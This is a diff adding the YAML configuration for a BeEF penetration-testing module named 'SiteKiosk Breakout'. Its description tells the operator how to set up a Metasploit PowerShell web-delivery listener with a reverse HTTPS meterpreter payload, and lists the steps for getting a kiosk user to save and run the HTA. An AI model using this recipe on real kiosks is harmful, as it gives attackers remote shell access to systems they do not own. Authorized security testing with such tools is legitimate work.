@@ -1,0 +1,16 @@
+#
+# Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+beef:
+    module:
+        sitekiosk_breakout:
+            enable: true
+            category: ["Social Engineering"]
+            name: "SiteKiosk Breakout"
+            description: "This Module breaks out of SiteKiosk by using HTA. The HTA closes the kiosk and starts a reverse meterpreter shell via a powershell payload!<br>Before launching the module, do the following on Metasploit:<br>use exploit/windows/misc/psh_web_delivery<br>set URIPATH /psh<br>set PAYLOAD windows/meterpreter/reverse_https<br>set LHOST x.x.x.x<br>set LPORT 443<br>set ExitOnSession false<br>set AutoRunScript post/windows/manage/smart_migrate<br>exploit -j -z<br><br>After executing the module, follow this steps:<br>Click Save<br>Enter shell:ProgramFiles in the Save Dialogs adressbar<br>Navigate to C:\\Users\\Public\\Downloads<br>Save the file<br>After the Download is finished click on execute<br>Profit"
+            authors: ["insertscript"]
+            target:
+                user_notify: ["IE"]
+                not_working: ["ALL"]
